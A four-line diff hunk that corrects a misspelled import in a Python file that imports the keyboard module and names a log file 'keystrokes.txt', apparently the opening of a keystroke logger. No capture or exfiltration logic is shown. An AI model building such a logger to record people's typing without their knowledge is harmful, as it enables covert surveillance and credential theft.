@@ -1,4 +1,4 @@
-mport keyboard  
+import keyboard  
 import time
 
 log_file = "keystrokes.txt"
